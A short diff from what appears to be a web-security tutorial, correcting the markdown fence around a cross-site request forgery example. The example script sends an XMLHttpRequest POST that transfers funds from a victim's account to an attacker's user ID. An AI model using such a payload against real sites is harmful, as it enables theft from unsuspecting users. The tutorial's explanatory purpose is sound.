@@ -555,8 +555,8 @@ app.get('/mutants/:role', function(req, res, next){
 
 * In this example an `XMLHttpRequest` is used to transfer funds from the victim to the attacker.
 
-```
-<script>html
+```html
+<script>
   var xhr = new XMLHttpRequest();
   xhr.open('POST',http://youvenoidea.com/transfer',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'); xhr.send('transfer[from]=5124834860&transfer[to_user_id]=48&transfer[amount]=1000&commit=Transfer');
   </script>
